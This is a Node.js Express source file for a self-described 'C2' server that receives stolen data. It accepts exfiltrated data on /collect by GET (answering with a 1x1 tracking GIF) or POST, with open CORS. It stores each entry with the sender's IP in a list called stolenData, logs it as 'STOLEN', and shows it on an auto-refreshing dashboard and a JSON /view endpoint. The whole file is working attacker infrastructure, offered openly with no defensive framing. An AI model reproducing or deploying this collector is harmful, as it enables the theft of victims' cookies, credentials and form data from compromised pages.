const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

let stolenData = [];
let counter = 0;

// Simple health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', entries: stolenData.length });
});

// GET collect
app.get('/collect', (req, res) => {
    counter++;
    stolenData.push({
        id: counter,
        timestamp: new Date().toISOString(),
        ip: req.ip,
        data: req.query
    });
    console.log('🔥 STOLEN:', JSON.stringify(req.query));
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.set('Content-Type', 'image/gif');
    res.send(gif);
});

// POST collect
app.post('/collect', (req, res) => {
    counter++;
    stolenData.push({
        id: counter,
        timestamp: new Date().toISOString(),
        ip: req.ip,
        data: req.body
    });
    console.log('🔥 STOLEN:', JSON.stringify(req.body));
    res.json({ status: 'ok', id: counter });
});

// Dashboard
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Dashboard</title>
            <meta http-equiv="refresh" content="5">
            <style>
                body{background:#0a0a1a;color:#00ff88;font-family:monospace;padding:20px}
                h1{color:#e94560}
                .entry{background:#1a1a2e;padding:15px;margin:10px 0;border-radius:10px;border:1px solid #2a2a4a}
                pre{background:#0d0d1a;padding:12px;border-radius:6px;color:#44aaff;font-size:12px;overflow-x:auto}
                .count{font-size:36px;color:#e94560;font-weight:bold}
                .empty{text-align:center;padding:60px;color:#666}
            </style>
        </head>
        <body>
            <h1>🎯 C2 DASHBOARD</h1>
            <div class="count">📦 ${stolenData.length} entries</div>
            ${stolenData.length === 0 ? 
                '<div class="empty"><div style="font-size:64px">📡</div><div>Waiting for data...</div></div>' :
                stolenData.slice().reverse().map(d => `
                    <div class="entry">
                        <div style="color:#666;font-size:11px">#${d.id} | ${d.timestamp} | ${d.ip}</div>
                        <pre>${JSON.stringify(d.data, null, 2)}</pre>
                    </div>
                `).join('')
            }
        </body>
        </html>
    `);
});

app.get('/view', (req, res) => {
    res.json({ total: stolenData.length, data: stolenData });
});

// Use 0.0.0.0 to accept external connections
app.listen(PORT, '0.0.0.0', () => {
    console.log('🎯 C2 SERVER RUNNING on port ' + PORT);
});